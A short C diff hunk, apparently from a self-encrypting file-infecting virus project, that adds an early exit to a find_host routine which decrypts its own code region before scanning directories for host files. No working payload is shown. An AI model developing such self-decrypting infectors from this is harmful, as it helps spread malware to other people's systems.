@@ -92,6 +92,9 @@ void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, cons
 {
 	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);
 
+	if (context == FAILURE)
+		goto label;
+
 	struct s_directory *directory = (struct s_directory *)dir;
 	char *filename;
 
